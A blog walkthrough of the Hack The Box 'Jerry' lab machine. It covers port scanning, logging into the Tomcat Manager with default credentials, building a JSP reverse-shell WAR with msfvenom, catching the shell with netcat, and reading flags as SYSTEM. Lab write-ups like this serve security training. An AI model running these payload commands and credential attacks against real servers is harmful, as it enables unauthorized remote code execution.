<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Jerry - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,jerry,windows-target,easy-box,user-own,system-own,retired,tomcat,web,vulnerability-assessment,common-services,security-tools,msfvenom,java,brute-force-attack,remote-code-execution,arbitrary-file-upload,default-credentials"><meta name=description content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Jerry machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/jerry/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/48x48.svg><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/16x16_white.svg><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/32x32_white.svg><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/180x180_white.svg><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Jerry - Walkthrough"><meta property="og:description" content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Jerry machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/jerry/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-28T12:00:00+00:00"><meta property="article:modified_time" content="2023-05-28T12:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Jerry - Walkthrough"><meta name=twitter:description content="SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.
The aim of this walkthrough is to provide help with the Jerry machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Jerry - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/jerry/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Jerry - Walkthrough","name":"HTB - Jerry - Walkthrough","description":"SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.\nThe aim of this walkthrough is to provide help with the Jerry machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.","keywords":["htb","walkthrough","jerry","windows-target","easy-box","user-own","system-own","retired","tomcat","web","vulnerability-assessment","common-services","security-tools","msfvenom","java","brute-force-attack","remote-code-execution","arbitrary-file-upload","default-credentials"],"articleBody":"SYNOPSIS Outlining the attack path demonstrated in this writeup is much easier through a picture rather than a description, since a picture is worth a thousand words.\nThe aim of this walkthrough is to provide help with the Jerry machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out with finishing the Beginner-Track challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ Finally, a very simple and basic file structure used throughout this writeup for this particular pentest:\n1_recon –\u003e information gathering, enumeration and scanning, active/passive recon 2_exploitation –\u003e exploits, foothold, lateral movement 3_post-exploitation –\u003e privilege-escalation, lateral movement, persistence Generating it is can be done by the following one-liner:\nmkdir 1_recon; mkdir 2_exploitation; mkdir 3_post-exploitation INFORMATION-GATHERING We start out with a quick connection check\n# shell command ping -c 4 -n -R $rhost \u003e connection-test.txt # command line interaction ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ ping -c 4 -n -R $rhost \u003e connection-test.txt ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ cat connection-test.txt PING 10.129.136.9 (10.129.136.9) 56(124) bytes of data. 64 bytes from 10.129.136.9: icmp_seq=1 ttl=127 time=10.4 ms 64 bytes from 10.129.136.9: icmp_seq=2 ttl=127 time=10.0 ms 64 bytes from 10.129.136.9: icmp_seq=3 ttl=127 time=9.72 ms 64 bytes from 10.129.136.9: icmp_seq=4 ttl=127 time=12.7 ms --- 10.129.136.9 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 9.715/10.693/12.663/1.159 ms ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ followed by the usual (syn, version, script, all-ports) tcp scan.\n# shell command nmap -Pn -sT -p- -min-rate 5000 -oN nmap-syn-allports-scan $rhost # command line interaction ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ nmap -Pn -sT -p- -min-rate 5000 -oN nmap-syn-allports-scan $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 18:00 BST Nmap scan report for 10.129.136.9 Host is up (0.022s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 26.46 seconds ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ Only one ports seems to be open: port 8080. Let’s get some more details on that.\n# shell command nmap -Pn -sT -p 8080 -sC -sV -oN nmap-syn-script-version-p8080-scan $rhost # command line interaction ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ nmap -Pn -sT -p 8080 -sC -sV -oN nmap-syn-script-version-p8080-scan $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 18:01 BST Nmap scan report for 10.129.136.9 Host is up (0.011s latency). PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-title: Apache Tomcat/7.0.88 |_http-server-header: Apache-Coyote/1.1 |_http-favicon: Apache Tomcat Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ It appears to be running an apache tomcat webserver. How about it’s fingerprint?\n# shell command whatweb http://$rhost:8080/ \u003e whatweb-p8080-fingerprint # command line interaction ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ whatweb http://$rhost:8080/ \u003e whatweb-p8080-fingerprint ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ cat whatweb-p8080-fingerprint http://10.129.136.9:8080/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.129.136.9], Title[Apache Tomcat/7.0.88] ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ We finish up our nmap scans with a quick all-ports udp scan followed by a (simple) os scan. (Definitely do not want to miss any potential udp services.)\n# shell command sudo nmap -Pn -sU -p- --min-rate 10000 -oN nmap-udp-allport-scan $rhost # command line interaction ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ sudo nmap -Pn -sU -p- --min-rate 10000 -oN nmap-udp-allport-scan $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 18:03 BST Nmap scan report for 10.129.136.9 Host is up. All 65535 scanned ports on 10.129.136.9 are in ignored states. Not shown: 65535 open|filtered udp ports (no-response) Nmap done: 1 IP address (1 host up) scanned in 50.87 seconds ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ # shell command sudo nmap -O -oN nmap-os-scan $rhost # command line interaction ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ sudo nmap -O -oN nmap-os-scan $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 18:28 BST Nmap scan report for 10.129.136.9 Host is up (0.013s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE 8080/tcp open http-proxy Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%) No exact OS matches for host (test conditions non-ideal). OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.49 seconds ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ It looks like all udp ports are down and we have a windows target on our hands. But before we move on, we do a quick (small, common wordlist) dir-busting on the webserver.\n# shell command gobuster dir -u http://$rhost:8080/ -w /usr/share/wordlists/dirb/common.txt -q \u003e gobuster-dir-common-enum # command line interaction ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ gobuster dir -u http://$rhost:8080/ -w /usr/share/wordlists/dirb/common.txt -q \u003e gobuster-dir-common-enum ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ cat gobuster-dir-common-enum /aux (Status: 200) [Size: 0] /com1 (Status: 200) [Size: 0] /com2 (Status: 200) [Size: 0] /com3 (Status: 200) [Size: 0] /con (Status: 200) [Size: 0] /docs (Status: 302) [Size: 0] [--\u003e /docs/] /examples (Status: 302) [Size: 0] [--\u003e /examples/] /favicon.ico (Status: 200) [Size: 21630] /host-manager (Status: 302) [Size: 0] [--\u003e /host-manager/] /lpt1 (Status: 200) [Size: 0] /lpt2 (Status: 200) [Size: 0] /manager (Status: 302) [Size: 0] [--\u003e /manager/] /nul (Status: 200) [Size: 0] /prn (Status: 200) [Size: 0] ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/1_recon] └──╼ [★]$ We note the results and we move on.\nIt’s time to fire up our web browser and check out that aforementioned webpage. It looks like a default welcoming site one would get after a successful installation. The part which especially stands out is the displayed apache tomcat version: - Apache Tomcat/7.0.88 -.\nGoofing around a bit, we notice a couple of things:\nonly the tabs Documentation, Configuration, Examples do redirect to sites that are hosted by the target login for - http://$rhost:8080/manager/status - (accessible via Server Status) is quite easy with the default credentials - admin:admin - login for - http://$rhost:8080/manager/html - (accessible via Manager App) and requires other login credentials login for - http://$rhost:8080/host-manager/html - (accessible via Host Manager) and requires other login credentials there are some default credentials - tomcat:s3cret - mentioned for the Manager App Sadly, accessing the server status webpage proves unhelpful - there is simply not much we can do here.\nAccessing the Manager App on the other hand looks very promising. Not only were the default credentials - tomcat:s3cret - not changed, but the Tomcat Web Application Manager just provided us with some file upload capabilities.\nMoreover, there are some potentially very important pieces of information at the bottom of the page under Server Information:\nTomcat Version –\u003e Apache Tomcat/7.0.88 JVM Version –\u003e 1.8.0_171-b11 JVM Vendor –\u003e Oracle Corporation OS Name –\u003e Windows Server 2012 R2 OS Version –\u003e 6.3 OS Architecture –\u003e amd64 Hostname –\u003e JERRY IP Address –\u003e 10.129.136.9 Before we capitalize on the file upload functionality, let’s try the same default credentials on the Host Manager. No luck this time - still worth a try though.\nLooking around for an appropriate payload (WAR files are mentioned) we came across the PayloadAllTheThings website mentioning the following:\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war \u003e reverse.war strings reverse.war | grep jsp # in order to get the name of the file So in a nutshell, we use msfvenom to create a java reverse shell in a war packeting format and then we look for the exact jsp file within this war archive.\nEXPLOITATION Adjusting our payload creation a bit by especially specifying our target’s architecture (amd64 –\u003e x64) as a 64bit architecture and modifying the local host/port to match our pwnbox’s ip address should do it.\n# shell command msfvenom -p java/jsp_shell_reverse_tcp -a x64 -f war LHOST=10.10.14.99 LPORT=4444 \u003e revshell.war # command line interaction ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/2_exploitation] └──╼ [★]$ msfvenom -p java/jsp_shell_reverse_tcp -a x64 -f war LHOST=10.10.14.99 LPORT=4444 \u003e revshell.war Payload size: 1087 bytes Final size of war file: 1087 bytes ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/2_exploitation] └──╼ [★]$ ll total 4.0K -rw-r--r-- 1 htb-bluewalle htb-bluewalle 1.1K May 28 19:30 revshell.war ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/2_exploitation] └──╼ [★]$ file revshell.war revshell.war: Zip archive data, at least v2.0 to extract ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/2_exploitation] └──╼ [★]$ As instructed, let’s search for the jsp file that’s hidden inside the war archive. Maybe it we will need it for later?\n# shell command strings revshell.war | grep jsp # command line interaction ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/2_exploitation] └──╼ [★]$ strings revshell.war | grep jsp nkvbztft.jsp}T]k nkvbztft.jspPK ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/jerry/2_exploitation] └──╼ [★]$ Before we upload our reverse shell we start a netcat listener to catch when our target tries connecting back.\n# shell command nc -lvnp 4444 # command line interaction ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/Desktop] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Since we are done with the preparations, let’s upload it.\nOnce uploaded, our reverse shell listed and made available under Applications.\nAccessing it - http://$rhost:8080/revshell/ - lands us a connection in our netcat listener.\n# reverse shell connecting back - caught in our netcat listener ┌─[eu-dedivip-1]─[10.10.14.99]─[htb-bluewalle@htb-9icrodcg3p]─[~/Desktop] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.129.136.9. Ncat: Connection from 10.129.136.9:49192. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\apache-tomcat-7.0.88\u003e Checking our privileges with - whoami - reveals something shocking… We have system access which pretty much eliminates any notion for privilege escalation or lateral movement (in this case).\nPOST-EXPLOITATION After goofing around a bit, we find the flags at - C:\\Users\\Administrator\\Desktop\\flags\\2 for the price of 1.txt - and grabbing them, get’s us the box.\n# command line interaction - grabbing the flags on $rhost C:\\apache-tomcat-7.0.88\u003edir dir Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\apache-tomcat-7.0.88 06/19/2018 04:07 AM . 06/19/2018 04:07 AM .. 06/19/2018 04:06 AM bin 06/19/2018 06:47 AM conf 06/19/2018 04:06 AM lib 05/07/2018 02:16 PM 57,896 LICENSE 05/29/2023 02:56 AM logs 05/07/2018 02:16 PM 1,275 NOTICE 05/07/2018 02:16 PM 9,600 RELEASE-NOTES 05/07/2018 02:16 PM 17,454 RUNNING.txt 06/19/2018 04:06 AM temp 05/29/2023 04:50 AM webapps 06/19/2018 04:34 AM work 4 File(s) 86,225 bytes 9 Dir(s) 2,364,542,976 bytes free C:\\apache-tomcat-7.0.88\u003ecd .. cd .. C:\\\u003epwd pwd C:\\\u003edir dir Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\ 06/19/2018 04:07 AM apache-tomcat-7.0.88 08/22/2013 06:52 PM PerfLogs 06/19/2018 06:42 PM Program Files 06/19/2018 06:42 PM Program Files (x86) 06/18/2018 11:31 PM Users 01/21/2022 09:49 PM Windows 0 File(s) 0 bytes 6 Dir(s) 2,364,542,976 bytes free C:\\\u003ecd Users cd Users C:\\Users\u003edir dir Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users 06/18/2018 11:31 PM . 06/18/2018 11:31 PM .. 06/18/2018 11:31 PM Administrator 08/22/2013 06:39 PM Public 0 File(s) 0 bytes 4 Dir(s) 2,364,542,976 bytes free C:\\Users\u003ecd Administrator cd Administrator C:\\Users\\Administrator\u003edir dir Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users\\Administrator 06/18/2018 11:31 PM . 06/18/2018 11:31 PM .. 06/19/2018 06:43 AM Contacts 06/19/2018 07:09 AM Desktop 06/19/2018 06:43 AM Documents 01/21/2022 09:23 PM Downloads 06/19/2018 06:43 AM Favorites 06/19/2018 06:43 AM Links 06/19/2018 06:43 AM Music 06/19/2018 06:43 AM Pictures 06/19/2018 06:43 AM Saved Games 06/19/2018 06:43 AM Searches 06/19/2018 06:43 AM Videos 0 File(s) 0 bytes 13 Dir(s) 2,364,542,976 bytes free C:\\Users\\Administrator\u003ecd Desktop cd Desktop C:\\Users\\Administrator\\Desktop\u003edir dir Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users\\Administrator\\Desktop 06/19/2018 07:09 AM . 06/19/2018 07:09 AM .. 06/19/2018 07:09 AM flags 0 File(s) 0 bytes 3 Dir(s) 2,364,542,976 bytes free C:\\Users\\Administrator\\Desktop\u003etype flags type flags C:\\Users\\Administrator\\Desktop\u003ecd flags cd flags C:\\Users\\Administrator\\Desktop\\flags\u003edir dir Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users\\Administrator\\Desktop\\flags 06/19/2018 07:09 AM . 06/19/2018 07:09 AM .. 06/19/2018 07:11 AM 88 2 for the price of 1.txt 1 File(s) 88 bytes 2 Dir(s) 2,364,542,976 bytes free C:\\Users\\Administrator\\Desktop\\flags\u003etype \"2 for the price of 1.txt\" type \"2 for the price of 1.txt\" user.txt root.txt C:\\Users\\Administrator\\Desktop\\flags\u003e Congratulations, we just successfully pwned the target machine. All that’s left for us now is to simply submit the flags and terminate the target box (if not terminated automatically).\n","wordCount":"2198","inLanguage":"en","datePublished":"2023-05-28T12:00:00Z","dateModified":"2023-05-28T12:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/jerry/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/48x48.svg"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/180x180_white.svg alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Jerry - Walkthrough</h1><div class=post-meta><span title='2023-05-28 12:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;2198 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#synopsis><strong>SYNOPSIS</strong></a></li><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#information-gathering><strong>INFORMATION-GATHERING</strong></a></li><li><a href=#exploitation><strong>EXPLOITATION</strong></a></li><li><a href=#post-exploitation><strong>POST-EXPLOITATION</strong></a></li></ul></nav></div></details></div><div class=post-content><h2 id=synopsis><strong>SYNOPSIS</strong><a hidden class=anchor aria-hidden=true href=#synopsis>#</a></h2><p>Outlining the <strong>attack path</strong> demonstrated in this <strong>writeup</strong> is much easier through a picture rather than a description, since <strong>a picture is worth a thousand words</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/jerry/attack-path_jerry.png alt="Attack Path - Jerry" title="Attack Path - Jerry"></p><p>The aim of this walkthrough is to provide help with the <a href=https://app.hackthebox.com/machines/144 title=Jerry>Jerry</a> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out with finishing the <a href=https://app.hackthebox.com/tracks/Beginner-Track title=Beginner-Track>Beginner-Track</a> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>Finally, a very simple and basic <strong>file structure</strong> used throughout this <strong>writeup</strong> for this particular <strong>pentest</strong>:</p><ul><li>1_recon &ndash;> information gathering, enumeration and scanning, active/passive recon</li><li>2_exploitation &ndash;> exploits, foothold, lateral movement</li><li>3_post-exploitation &ndash;> privilege-escalation, lateral movement, persistence</li></ul><p><strong>Generating it</strong> is can be done by the following <strong>one-liner</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir 1_recon<span class=p>;</span> mkdir 2_exploitation<span class=p>;</span> mkdir 3_post-exploitation
</span></span></code></pre></div><h2 id=information-gathering><strong>INFORMATION-GATHERING</strong><a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><p>We start out with a quick <strong>connection check</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>ping -c <span class=m>4</span> -n -R <span class=nv>$rhost</span> &gt; connection-test.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># command line interaction</span>
